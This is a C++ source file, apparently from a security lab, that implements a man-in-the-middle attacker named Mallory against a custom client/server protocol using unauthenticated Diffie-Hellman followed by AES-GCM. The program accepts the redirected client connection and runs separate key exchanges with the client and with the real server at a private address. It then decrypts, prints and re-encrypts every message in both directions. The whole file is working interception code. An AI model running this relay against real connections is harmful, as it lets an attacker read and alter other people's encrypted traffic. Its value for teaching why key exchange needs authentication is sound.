#include <iostream>
#include <string>
#include <cstring>
#include <thread>

#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "crypto.h"


const char* SERVER_IP = "192.168.64.3";
const int SERVER_PORT = 5000;
const int MALLORY_PORT = 5000;


// Send the complete message.
bool send_all(
    int fd,
    const std::string& message)
{
    size_t total_sent = 0;

    while (total_sent < message.size()) {

        int bytes_sent =
            send(
                fd,
                message.data() + total_sent,
                message.size() - total_sent,
                0
            );

        if (bytes_sent <= 0) {
            return false;
        }

        total_sent += bytes_sent;
    }

    return true;
}


// Receive one newline-terminated message.
bool receive_line(
    int fd,
    std::string& buffer,
    std::string& line)
{
    while (true) {

        size_t newline_pos =
            buffer.find('\n');

        if (newline_pos != std::string::npos) {

            line =
                buffer.substr(
                    0,
                    newline_pos
                );

            buffer.erase(
                0,
                newline_pos + 1
            );

            return true;
        }


        char temp[4096];

        int bytes =
            recv(
                fd,
                temp,
                sizeof(temp),
                0
            );

        if (bytes <= 0) {
            return false;
        }

        buffer.append(
            temp,
            bytes
        );
    }
}


//
// Mallory acts as the server to the client.
//
// Client sends:
// DH|client_public
//
// Mallory sends:
// DH|mallory_public
//
// Both now have the same secret.
//
bool perform_dh_with_client(
    int client_fd,
    std::vector<unsigned char>& aes_key)
{
    std::string buffer;
    std::string line;


    //
    // Receive client's DH public value.
    //
    if (!receive_line(
            client_fd,
            buffer,
            line)) {

        return false;
    }


    if (line.rfind("DH|", 0) != 0) {

        std::cerr
            << "Client did not send DH."
            << std::endl;

        return false;
    }


    std::string client_public_text =
        line.substr(3);


    BIGNUM* client_public =
        string_to_bn(
            client_public_text
        );


    if (!client_public) {
        return false;
    }


    //
    // Generate Mallory's DH key pair.
    //
    DHKeyPair mallory_dh =
        generate_dh_keypair();


    //
    // Send Mallory's public value
    // to the client.
    //
    std::string mallory_public =
        bn_to_string(
            mallory_dh.public_key
        );


    if (!send_all(
            client_fd,
            "DH|" +
            mallory_public +
            "\n")) {

        BN_free(client_public);
        BN_free(mallory_dh.private_key);
        BN_free(mallory_dh.public_key);

        return false;
    }


    //
    // Calculate Client <-> Mallory
    // shared secret.
    //
    BIGNUM* shared_secret =
        compute_dh_shared_secret(
            mallory_dh.private_key,
            client_public
        );


    aes_key =
        derive_aes_key(
            shared_secret
        );


    std::cout
        << "[Mallory] Client-side DH fingerprint: "
        << fingerprint(shared_secret)
        << std::endl;


    BN_free(client_public);
    BN_free(mallory_dh.private_key);
    BN_free(mallory_dh.public_key);
    BN_free(shared_secret);


    return true;
}


//
// Mallory acts as the client to the real server.
//
// Mallory sends:
// DH|mallory_public
//
// Server sends:
// DH|server_public
//
// Both now have the same secret.
//
bool perform_dh_with_server(
    int server_fd,
    std::vector<unsigned char>& aes_key)
{
    //
    // Generate Mallory's second,
    // independent DH key pair.
    //
    DHKeyPair mallory_dh =
        generate_dh_keypair();


    //
    // Send Mallory's public value
    // to the real server.
    //
    std::string mallory_public =
        bn_to_string(
            mallory_dh.public_key
        );


    if (!send_all(
            server_fd,
            "DH|" +
            mallory_public +
            "\n")) {

        BN_free(mallory_dh.private_key);
        BN_free(mallory_dh.public_key);

        return false;
    }


    //
    // Receive server's public value.
    //
    std::string buffer;
    std::string line;


    if (!receive_line(
            server_fd,
            buffer,
            line)) {

        BN_free(mallory_dh.private_key);
        BN_free(mallory_dh.public_key);

        return false;
    }


    if (line.rfind("DH|", 0) != 0) {

        std::cerr
            << "Server did not send DH."
            << std::endl;

        BN_free(mallory_dh.private_key);
        BN_free(mallory_dh.public_key);

        return false;
    }


    std::string server_public_text =
        line.substr(3);


    BIGNUM* server_public =
        string_to_bn(
            server_public_text
        );


    if (!server_public) {

        BN_free(mallory_dh.private_key);
        BN_free(mallory_dh.public_key);

        return false;
    }


    //
    // Calculate Mallory <-> Server
    // shared secret.
    //
    BIGNUM* shared_secret =
        compute_dh_shared_secret(
            mallory_dh.private_key,
            server_public
        );


    aes_key =
        derive_aes_key(
            shared_secret
        );


    std::cout
        << "[Mallory] Server-side DH fingerprint: "
        << fingerprint(shared_secret)
        << std::endl;


    BN_free(server_public);
    BN_free(mallory_dh.private_key);
    BN_free(mallory_dh.public_key);
    BN_free(shared_secret);


    return true;
}


//
// Client -> Mallory -> Server
//
void relay_client_to_server(
    int client_fd,
    int server_fd,
    const std::vector<unsigned char>& client_key,
    const std::vector<unsigned char>& server_key)
{
    std::string buffer;
    std::string line;


    while (true) {

        if (!receive_line(
                client_fd,
                buffer,
                line)) {

            break;
        }


        //
        // Everything after DH should
        // be encrypted.
        //
        if (line.rfind("ENC|", 0) != 0) {

            std::cerr
                << "[Mallory] Unexpected client message: "
                << line
                << std::endl;

            continue;
        }


        //
        // Remove ENC|
        //
        std::string encoded =
            line.substr(4);


        //
        // Convert hex back to bytes.
        //
        std::string encrypted =
            hex_to_bytes(
                encoded
            );


        //
        // Decrypt using
        // Client <-> Mallory key.
        //
        std::string plaintext;


        if (!aes_gcm_decrypt(
                encrypted,
                client_key,
                plaintext)) {

            std::cerr
                << "[Mallory] Client AES-GCM authentication failed."
                << std::endl;

            break;
        }


        //
        // Mallory can now see
        // the plaintext.
        //
        std::cout
            << "[CLIENT -> SERVER] "
            << plaintext
            << std::endl;


        //
        // Encrypt the same plaintext
        // using the OTHER key.
        //
        std::string reencrypted =
            aes_gcm_encrypt(
                plaintext,
                server_key
            );


        std::string outgoing =
            "ENC|" +
            bytes_to_hex(
                reencrypted
            ) +
            "\n";


        if (!send_all(
                server_fd,
                outgoing)) {

            break;
        }
    }
}


//
// Server -> Mallory -> Client
//
void relay_server_to_client(
    int server_fd,
    int client_fd,
    const std::vector<unsigned char>& server_key,
    const std::vector<unsigned char>& client_key)
{
    std::string buffer;
    std::string line;


    while (true) {

        if (!receive_line(
                server_fd,
                buffer,
                line)) {

            break;
        }


        //
        // Everything after DH should
        // be encrypted.
        //
        if (line.rfind("ENC|", 0) != 0) {

            std::cerr
                << "[Mallory] Unexpected server message: "
                << line
                << std::endl;

            continue;
        }


        //
        // Remove ENC|
        //
        std::string encoded =
            line.substr(4);


        //
        // Convert hex back to bytes.
        //
        std::string encrypted =
            hex_to_bytes(
                encoded
            );


        //
        // Decrypt using
        // Mallory <-> Server key.
        //
        std::string plaintext;


        if (!aes_gcm_decrypt(
                encrypted,
                server_key,
                plaintext)) {

            std::cerr
                << "[Mallory] Server AES-GCM authentication failed."
                << std::endl;

            break;
        }


        //
        // Mallory can see the plaintext.
        //
        std::cout
            << "[SERVER -> CLIENT] "
            << plaintext
            << std::endl;


        //
        // Encrypt using the
        // Client <-> Mallory key.
        //
        std::string reencrypted =
            aes_gcm_encrypt(
                plaintext,
                client_key
            );


        std::string outgoing =
            "ENC|" +
            bytes_to_hex(
                reencrypted
            ) +
            "\n";


        if (!send_all(
                client_fd,
                outgoing)) {

            break;
        }
    }
}


int main()
{
    //
    // Create Mallory's listening socket.
    //
    int listen_fd =
        socket(
            AF_INET,
            SOCK_STREAM,
            0
        );


    if (listen_fd == -1) {

        std::cerr
            << "Could not create socket."
            << std::endl;

        return 1;
    }


    int option = 1;

    setsockopt(
        listen_fd,
        SOL_SOCKET,
        SO_REUSEADDR,
        &option,
        sizeof(option)
    );


    sockaddr_in mallory_addr{};

    mallory_addr.sin_family =
        AF_INET;

    mallory_addr.sin_port =
        htons(MALLORY_PORT);

    mallory_addr.sin_addr.s_addr =
        INADDR_ANY;


    //
    // Listen on port 5000.
    //
    if (bind(
            listen_fd,
            (struct sockaddr*)&mallory_addr,
            sizeof(mallory_addr)
        ) == -1) {

        std::cerr
            << "Bind failed."
            << std::endl;

        close(listen_fd);

        return 1;
    }


    if (listen(
            listen_fd,
            10
        ) == -1) {

        std::cerr
            << "Listen failed."
            << std::endl;

        close(listen_fd);

        return 1;
    }


    std::cout
        << "Mallory MITM listening on port "
        << MALLORY_PORT
        << std::endl;


    while (true) {

        sockaddr_in client_addr{};

        socklen_t client_len =
            sizeof(client_addr);


        //
        // Wait for the connection
        // redirected to Mallory.
        //
        int client_fd =
            accept(
                listen_fd,
                (struct sockaddr*)&client_addr,
                &client_len
            );


        if (client_fd == -1) {
            continue;
        }


        std::cout
            << "\n[+] Client connection intercepted."
            << std::endl;


        //
        // Connect to the REAL server.
        //
        int server_fd =
            socket(
                AF_INET,
                SOCK_STREAM,
                0
            );


        if (server_fd == -1) {

            close(client_fd);

            continue;
        }


        sockaddr_in server_addr{};

        server_addr.sin_family =
            AF_INET;

        server_addr.sin_port =
            htons(SERVER_PORT);


        inet_pton(
            AF_INET,
            SERVER_IP,
            &server_addr.sin_addr
        );


        if (connect(
                server_fd,
                (struct sockaddr*)&server_addr,
                sizeof(server_addr)
            ) == -1) {

            std::cerr
                << "Could not connect to real server."
                << std::endl;

            close(client_fd);
            close(server_fd);

            continue;
        }


        std::cout
            << "[+] Connected to real server."
            << std::endl;


        //
        // Key 1:
        //
        // Client <-> Mallory
        //
        std::vector<unsigned char>
            client_key;


        //
        // Key 2:
        //
        // Mallory <-> Server
        //
        std::vector<unsigned char>
            server_key;


        //
        // Perform first DH handshake.
        //
        if (!perform_dh_with_client(
                client_fd,
                client_key)) {

            std::cerr
                << "Client DH failed."
                << std::endl;

            close(client_fd);
            close(server_fd);

            continue;
        }


        //
        // Perform second DH handshake.
        //
        if (!perform_dh_with_server(
                server_fd,
                server_key)) {

            std::cerr
                << "Server DH failed."
                << std::endl;

            close(client_fd);
            close(server_fd);

            continue;
        }


        std::cout
            << "[+] MITM cryptographic interception established."
            << std::endl;


        //
        // Two independent encrypted channels.
        //
        std::thread client_to_server(
            relay_client_to_server,
            client_fd,
            server_fd,
            client_key,
            server_key
        );


        std::thread server_to_client(
            relay_server_to_client,
            server_fd,
            client_fd,
            server_key,
            client_key
        );


        client_to_server.join();
        server_to_client.join();


        shutdown(
            client_fd,
            SHUT_RDWR
        );

        shutdown(
            server_fd,
            SHUT_RDWR
        );


        close(client_fd);
        close(server_fd);


        std::cout
            << "[+] Connection closed."
            << std::endl;
    }


    close(listen_fd);

    return 0;
}
